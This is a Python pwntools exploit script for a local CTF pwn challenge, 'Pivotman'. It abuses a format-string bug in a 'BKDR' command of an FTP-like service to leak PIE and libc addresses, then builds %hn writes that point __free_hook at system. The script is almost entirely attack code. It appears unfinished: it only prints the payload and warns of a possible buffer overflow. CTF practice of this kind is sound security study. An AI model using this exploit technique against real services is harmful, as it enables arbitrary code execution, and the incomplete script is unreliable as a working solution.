#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

CHALL_DIR = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Easy/Pivotman/pwn_pivotman/challenge'
ELF_PATH = f'{CHALL_DIR}/chall'
LD_PATH = f'{CHALL_DIR}/ld-linux-x86-64.so.2'
LIBC_PATH = f'{CHALL_DIR}/libc.so.6'

libc = ELF(LIBC_PATH, checksec=False)

def build_fmt_payload(writes):
    hw_writes = []
    for addr, val in writes.items():
        for j in range(4):
            hw_addr = addr + j * 2
            hw_val = (val >> (j * 16)) & 0xffff
            hw_writes.append((hw_addr, hw_val))
    hw_writes.sort(key=lambda x: x[1])
    
    total_est = 5
    for _ in hw_writes:
        total_est += 14
    est_padding = (8 - (3 + total_est) % 8) % 8
    addr_start_buf = 3 + total_est + est_padding
    
    current = 0
    fmt = b''
    for idx, (addr, val) in enumerate(hw_writes):
        pos = 1030 + (addr_start_buf // 8) + idx
        delta = (val - current) % 0x10000
        if delta == 0:
            delta = 0x10000
        spec = f'%{delta}c%{pos}$hn'.encode()
        fmt += spec
        current = val
    
    padding = (8 - (3 + 5 + len(fmt)) % 8) % 8
    fmt += b'.' * padding
    
    addrs = b''
    for addr, val in hw_writes:
        addrs += p64(addr)
    
    return b'BKDR ' + fmt + addrs

p = process([LD_PATH, ELF_PATH], cwd=CHALL_DIR)
p.recvuntil(b' \r\n', timeout=10)
p.sendline(b'USER ;)')
p.recvuntil(b' \r\n')
p.sendline(b'PASS ;)')
p.recvuntil(b' \r\n')

# Leak PIE + saved_rbp
p.sendline(b'BKDR %2737$p.%2736$p')
resp = p.recvuntil(b' \r\n')
marker = b' BKDR '
idx = resp.find(marker)
after = resp[idx + len(marker):]
parts = after.split(b'.')
pie_base = int(parts[0], 16) - 0x3a10
saved_rbp = int(parts[1], 16)
log.info(f'PIE: {hex(pie_base)}, saved_rbp: {hex(saved_rbp)}')

# Leak libc
puts_got = pie_base + 0x5ed8
payload = b'BKDR ' + b'%1032$sA' + p64(puts_got)
p.sendline(payload)
data = p.recvuntil(b'A', timeout=5)
idx = data.find(b' BKDR ')
leaked = data[idx + 6:-1]
puts_addr = u64(leaked[:8].ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
log.info(f'libc base: {hex(libc_base)}')

free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
log.info(f'free_hook: {hex(free_hook)}, system: {hex(system_addr)}')

# Build and print payload details
writes = {free_hook: system_addr}
payload = build_fmt_payload(writes)
log.info(f'Payload ({len(payload)} bytes): {payload[:80]}...')

# Calculate the actual positions
# After "BKDR ", the format specifiers come, then addrs
# Let me trace through the build_fmt_payload output
hw_writes = []
for j in range(4):
    hw_writes.append((free_hook + j*2, (system_addr >> (j*16)) & 0xffff))
hw_writes.sort(key=lambda x: x[1])

# Total fmt length guess
total_est = len(b'BKDR ')
for _ in hw_writes:
    total_est += 14
est_padding = (8 - (3 + total_est) % 8) % 8
addr_start_buf = 3 + total_est + est_padding
log.info(f'Estimated addr start in buffer: {addr_start_buf}')
for idx, (addr, val) in enumerate(hw_writes):
    pos = 1030 + (addr_start_buf // 8) + idx
    log.info(f'  Write {idx}: addr={hex(addr)}, val={hex(val)}, pos={pos}')

# Check vsnprintf output buffer size (0x1000)
# Calculate total chars to print from %c:
total_chars_to_print = sum(entry[1] for entry in hw_writes) + 0x10000 * 4  # due to modulo wrap
log.info(f'Total chars to print: {total_chars_to_print} (may overflow 0x1000 buffer)')

p.close()
